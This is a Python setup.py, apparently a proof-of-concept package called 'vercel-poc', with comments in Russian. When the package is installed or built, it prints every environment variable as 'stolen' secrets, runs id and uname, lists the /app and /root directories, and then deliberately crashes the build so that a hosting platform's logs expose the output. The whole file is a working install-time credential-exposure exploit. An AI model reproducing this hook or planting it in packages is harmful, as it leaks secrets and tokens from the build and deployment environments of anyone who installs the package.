import os
import sys
import subprocess
from setuptools import setup

def crash_and_burn():
    # Используем stderr, чтобы логи шли с высшим приоритетом
    err = sys.stderr.write
    
    err("\n" + "!"*60 + "\n")
    err("STOLEN DATA PREVIEW:\n")
    
    # 1. Дамп всех переменных (Самое ценное)
    for k, v in os.environ.items():
        err(f"SECRET_ENV: {k}={v}\n")
    
    # 2. Проверка прав и системы
    err(f"\n[#] IDENTITY: {subprocess.getoutput('id')}\n")
    err(f"[#] KERNEL: {subprocess.getoutput('uname -a')}\n")
    
    # 3. Поиск файлов в /app (исходники и конфиги)
    err("\n[!] FILES IN /app:\n")
    err(subprocess.getoutput("ls -R /app") + "\n")

    # 4. Проверка доступа к /root (раз мы UID 0)
    err("\n[!] ROOT DIR ACCESS:\n")
    err(subprocess.getoutput("ls -la /root 2>&1") + "\n")

    err("!"*60 + "\n")
    
    # ФИНАЛЬНЫЙ КРАШ: 
    # Это заставит Railway показать всё, что написано выше
    err("FORCE EXIT TO SHOW LOGS...\n")
    sys.exit(1) # Код ошибки 1 гарантирует падение билда

# Запускаем наш хаос
try:
    crash_and_burn()
except SystemExit:
    raise # Пробрасываем выход дальше
except Exception as e:
    sys.stderr.write(f"ERROR DURING EXPLOIT: {e}")
    sys.exit(1)

# До этого места pip не дойдет, но setup нужен для структуры
setup(name="vercel-poc", version="3.0.1")
